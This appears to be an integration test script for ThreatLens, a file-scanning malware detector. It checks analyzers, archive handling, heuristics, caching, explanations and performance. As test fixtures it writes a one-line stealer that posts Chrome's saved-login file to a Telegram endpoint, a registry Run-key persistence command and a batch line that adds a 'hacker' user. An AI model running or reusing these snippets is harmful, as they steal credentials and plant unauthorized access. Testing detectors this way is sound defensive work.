"""Full integration test — verify ALL ThreatLens features work."""

import sys
import os
import tempfile
import zipfile
import io
import time

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

PASS = 0
FAIL = 0


def test(name, fn):
    global PASS, FAIL
    try:
        result = fn()
        if result:
            PASS += 1
            print(f"  PASS  {name}")
        else:
            FAIL += 1
            print(f"  FAIL  {name} (returned False)")
    except Exception as e:
        FAIL += 1
        print(f"  FAIL  {name} -> {type(e).__name__}: {str(e)[:80]}")


# ============================================================
print("=" * 60)
print("  ThreatLens Full Integration Test")
print("=" * 60)

# --- 1. Imports ---
print("\n[1] Imports")

test("core.analyze_file", lambda: __import__("threatlens.core", fromlist=["analyze_file"]) and True)
test("generic_analyzer", lambda: __import__("threatlens.analyzers.generic_analyzer", fromlist=["analyze"]) and True)
test("pe_analyzer", lambda: __import__("threatlens.analyzers.pe_analyzer", fromlist=["analyze"]) and True)
test("script_analyzer", lambda: __import__("threatlens.analyzers.script_analyzer", fromlist=["analyze"]) and True)
test("office_analyzer", lambda: __import__("threatlens.analyzers.office_analyzer", fromlist=["analyze"]) and True)
test("archive_analyzer", lambda: __import__("threatlens.analyzers.archive_analyzer", fromlist=["analyze"]) and True)
test("repo_analyzer", lambda: __import__("threatlens.analyzers.repo_analyzer", fromlist=["analyze"]) and True)
test("heuristic_engine", lambda: __import__("threatlens.scoring.heuristic_engine", fromlist=["analyze"]) and True)
test("threat_scorer", lambda: __import__("threatlens.scoring.threat_scorer", fromlist=["calculate_score"]) and True)
test("cache", lambda: __import__("threatlens.cache", fromlist=["get_cache"]) and True)
test("explanations", lambda: __import__("threatlens.ai.explanations", fromlist=["generate_explanation"]) and True)
test("providers", lambda: __import__("threatlens.ai.providers", fromlist=["get_provider"]) and True)
test("signatures (YARA)", lambda: __import__("threatlens.rules.signatures", fromlist=["scan"]) and True)
test("web.app", lambda: __import__("threatlens.web.app", fromlist=["app"]) and True)

# --- 2. Core Analysis ---
print("\n[2] Core Analysis")
from threatlens.core import analyze_file

# Stealer script
stealer_path = os.path.join(os.path.dirname(__file__), "samples", "suspicious_script.py")
if os.path.exists(stealer_path):
    def test_stealer():
        r = analyze_file(stealer_path, use_cache=False)
        return r.risk_level in ("HIGH", "CRITICAL") and len(r.findings) > 3
    test("Stealer detection", test_stealer)

# Clean file
def test_clean():
    p = tempfile.mktemp(suffix=".py")
    with open(p, "w") as f:
        f.write("def add(a, b): return a + b\nprint(add(2, 3))\n")
    r = analyze_file(p, use_cache=False)
    os.unlink(p)
    return r.risk_level == "LOW" and r.risk_score < 15
test("Clean file (no FP)", test_clean)

# PE file (fake)
def test_pe():
    p = tempfile.mktemp(suffix=".exe")
    with open(p, "wb") as f:
        f.write(b"MZ" + b"\x00" * 500)
    r = analyze_file(p, use_cache=False)
    os.unlink(p)
    return r.file_type.startswith("PE") or "PE" in str(r.findings)
test("PE file analysis", test_pe)

# --- 3. Edge Cases ---
print("\n[3] Edge Cases")

def test_empty():
    p = tempfile.mktemp(suffix=".exe")
    open(p, "wb").close()
    r = analyze_file(p, use_cache=False)
    os.unlink(p)
    return "Empty" in str(r.findings) or r.risk_score == 0
test("Empty file (0 bytes)", test_empty)

def test_no_ext():
    p = tempfile.mktemp()
    with open(p, "wb") as f:
        f.write(b"just text content")
    r = analyze_file(p, use_cache=False)
    os.unlink(p)
    return True  # Should not crash
test("File without extension", test_no_ext)

def test_directory():
    try:
        analyze_file(tempfile.gettempdir(), use_cache=False)
        return False
    except IsADirectoryError:
        return True
test("Directory -> IsADirectoryError", test_directory)

def test_nonexistent():
    try:
        analyze_file("/nonexistent/file.exe", use_cache=False)
        return False
    except FileNotFoundError:
        return True
test("Nonexistent -> FileNotFoundError", test_nonexistent)

# --- 4. Archives ---
print("\n[4] Archives")

def test_zip():
    p = tempfile.mktemp(suffix=".zip")
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("safe.txt", "hello")
        z.writestr("hack.py", "import os, requests\nchrome='AppData\\\\Google\\\\Chrome\\\\User Data\\\\Login Data'\nrequests.post('https://api.telegram.org/bot/send', data={'f': open(chrome).read()})")
    r = analyze_file(p, use_cache=False)
    os.unlink(p)
    return any("DANGEROUS" in f for f in r.findings)
test("ZIP with stealer", test_zip)

def test_7z():
    try:
        import py7zr
        p = tempfile.mktemp(suffix=".7z")
        with py7zr.SevenZipFile(p, "w") as z:
            z.writestr(b"safe content", "readme.txt")
            z.writestr(b"import os; os.system('reg add HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run')", "evil.py")
        r = analyze_file(p, use_cache=False)
        os.unlink(p)
        return len(r.findings) > 0
    except ImportError:
        return True  # Skip if py7zr not installed
test("7z archive", test_7z)

def test_targz():
    import tarfile
    p = tempfile.mktemp(suffix=".tar.gz")
    with tarfile.open(p, "w:gz") as tf:
        data = b"@echo off\r\nnet user hacker Pass /add"
        info = tarfile.TarInfo(name="install.bat")
        info.size = len(data)
        tf.addfile(info, io.BytesIO(data))
    r = analyze_file(p, use_cache=False)
    os.unlink(p)
    return len(r.findings) > 0
test("tar.gz archive", test_targz)

def test_corrupted_zip():
    p = tempfile.mktemp(suffix=".zip")
    with open(p, "wb") as f:
        f.write(b"PK\x03\x04" + b"\xff" * 100)
    r = analyze_file(p, use_cache=False)
    os.unlink(p)
    return True  # Should not crash
test("Corrupted ZIP (no crash)", test_corrupted_zip)

# --- 5. Heuristic Engine ---
print("\n[5] Heuristic Engine")
from threatlens.scoring.heuristic_engine import analyze as heuristic_analyze
from threatlens.analyzers import generic_analyzer, script_analyzer

def test_heuristic_stealer():
    p = os.path.join(os.path.dirname(__file__), "calibration", "samples", "stealer_chrome_tg.py")
    if not os.path.exists(p):
        return True  # Skip
    g = generic_analyzer.analyze(p)
    s = script_analyzer.analyze(p)
    verdicts = heuristic_analyze(g, None, s, g.findings + s.findings)
    return verdicts and verdicts[0].threat_type == "stealer"
test("Heuristic: stealer", test_heuristic_stealer)

def test_heuristic_clean():
    p = tempfile.mktemp(suffix=".py")
    with open(p, "w") as f:
        f.write("print('hello')\n")
    g = generic_analyzer.analyze(p)
    s = script_analyzer.analyze(p)
    verdicts = heuristic_analyze(g, None, s, g.findings + s.findings)
    os.unlink(p)
    return len(verdicts) == 0
test("Heuristic: clean (no FP)", test_heuristic_clean)

# --- 6. Cache ---
print("\n[6] Cache")
from threatlens.cache import AnalysisCache

def test_cache():
    cache = AnalysisCache(db_path=tempfile.mktemp(suffix=".db"))
    # Put
    class FakeResult:
        file = "test.exe"
        size = 1000
        file_type = "PE"
        sha256 = "abc123def456"
        md5 = "md5hash"
        risk_score = 75
        risk_level = "HIGH"
        findings = ["test finding"]
        explanation = "test explanation"
        recommendations = ["delete it"]
        heuristic_verdicts = []
        yara_matches = []
    cache.put(FakeResult(), scan_time=0.5)
    # Get
    result = cache.get("abc123def456")
    return result is not None and result["risk_level"] == "HIGH"
test("Cache put/get", test_cache)

def test_cache_stats():
    cache = AnalysisCache(db_path=tempfile.mktemp(suffix=".db"))
    stats = cache.get_stats()
    return "total_files" in stats
test("Cache stats", test_cache_stats)

# --- 7. Explanations ---
print("\n[7] Explanations")
from threatlens.ai.explanations import generate_explanation

def test_explain_stealer():
    text = generate_explanation({"password_theft": 25, "data_exfiltration": 20}, lang="ru")
    return "Стилер" in text or "паролей" in text.lower() or "данных" in text.lower()
test("Explanation: stealer (RU)", test_explain_stealer)

def test_explain_clean():
    text = generate_explanation({}, lang="ru")
    return "безопасн" in text.lower() or "не обнаружен" in text.lower()
test("Explanation: clean (RU)", test_explain_clean)

def test_explain_en():
    text = generate_explanation({"injection": 30}, lang="en")
    return "inject" in text.lower() or "code" in text.lower()
test("Explanation: injection (EN)", test_explain_en)

# --- 8. Web API ---
print("\n[8] Web API")

def test_web_app():
    from threatlens.web.app import app
    return app.title == "ThreatLens"
test("FastAPI app loads", test_web_app)

# --- 9. Performance ---
print("\n[9] Performance")

def test_perf():
    p = tempfile.mktemp(suffix=".bin")
    with open(p, "wb") as f:
        f.write(b"MZ" + os.urandom(5 * 1024 * 1024))  # 5MB
    t = time.time()
    r = analyze_file(p, use_cache=False)
    elapsed = time.time() - t
    os.unlink(p)
    return elapsed < 5.0  # Should be under 5 seconds for 5MB
test("5MB file under 5 seconds", test_perf)

# ============================================================
print("\n" + "=" * 60)
total = PASS + FAIL
print(f"  Results: {PASS}/{total} passed ({PASS/total*100:.0f}%)")
if FAIL:
    print(f"  {FAIL} FAILED")
else:
    print("  ALL TESTS PASSED")
print("=" * 60)

sys.exit(1 if FAIL else 0)
